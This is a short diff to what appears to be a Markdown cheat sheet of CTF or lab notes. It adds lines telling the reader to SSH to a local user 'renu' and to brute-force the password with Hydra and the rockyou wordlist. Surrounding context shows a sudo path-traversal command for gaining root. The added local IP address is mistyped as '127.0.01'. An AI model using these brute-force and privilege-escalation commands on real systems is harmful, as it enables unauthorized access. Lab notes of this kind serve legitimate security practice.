@@ -50,6 +50,8 @@
   - ```sudo /bin/nice /notes/../home/user/letsgetroot.sh``` it will give the root access.
 
 - ## Hydra <a name="hydra"></a>
+- ssh renu@127.0.0.1
+- if you don't know the password do brute force attack. replace username with ```renu``` and ipaddress with ```127.0.01```
 - ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ipaddress> ssh -t 50```
 
 
